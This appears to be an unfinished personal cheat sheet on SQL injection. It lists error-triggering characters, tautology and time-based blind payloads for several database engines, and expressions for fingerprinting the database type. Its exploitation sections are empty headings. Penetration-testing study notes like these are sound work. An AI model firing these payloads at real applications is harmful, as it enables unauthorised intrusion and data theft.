---
sort : 2
---

# SQL Injection

# Detecte

## By triggering an error 

For every request we intercept, one of the GET param or POST data could be vulnerable to SQL injection, so, How can we know if it is.

```
[None]
'       ''      %27     
"       ""      %22
`       ``
#       ##      %23
;       ;;      %3B
*       ** 
/       //
\       \\
/*


%00     ;%00
-- -
/*â€¦*/
+ 
||
% 
```

## logical operations

```
" OR 1 = 1 -- -
' OR 1 -- -
" OR "" = "
' OR '' = '
' OR '1
```

## with Timing (Blindly)

```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```


[FOR MORE](https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b)






# DBMS Identification
```
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
`'OR conv('a',16,2)=conv('a',16,2) -- -`










### 3. Bypass the query

#### Using WHERE
```

```


#### Using LIKE









# Exploitation

1. Detecting number of columns
2. Detecting Data types of columns 
3. Extract database names, table names and column names
4. dump their content

### In-Band (Calssic)
 


### Blind 



### Out-Of-Band




## 3. References
* https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#MySQLInlineSamples














Web crawler is also used to
insert illegal characters into the query string of a URL and check for any error result sent
by the server






M : 	MySQL
S : 	SQL Server
P : 	PostgreSQL
O : 	Oracle
+ : 	Possibly all other databases


Examples;

    (MS) means : MySQL and SQL Server etc.
    (M*S) means : Only in some versions of MySQL or special conditions see related note and SQL Server
